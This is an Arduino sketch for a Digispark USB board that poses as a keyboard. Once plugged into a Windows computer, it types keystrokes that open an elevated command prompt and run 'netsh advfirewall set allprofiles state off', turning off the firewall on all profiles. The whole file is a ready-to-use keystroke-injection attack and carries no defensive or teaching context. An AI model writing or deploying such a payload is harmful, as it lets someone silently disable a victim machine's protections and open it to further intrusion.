#include <DigiKeyboard.h>
#define KEY_ARROW_RIGHT 0x4F
#define KEY_ARROW_DOWN  0x51

void setup() {
  pinMode(1, OUTPUT);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  disable_firewall();
}

void disable_firewall(){
  digitalWrite(1, HIGH);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(0x4F);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(0x51);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("netsh advfirewall set allprofiles state off");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, LOW);
}

void loop() {
  // put your main code here, to run repeatedly:
}
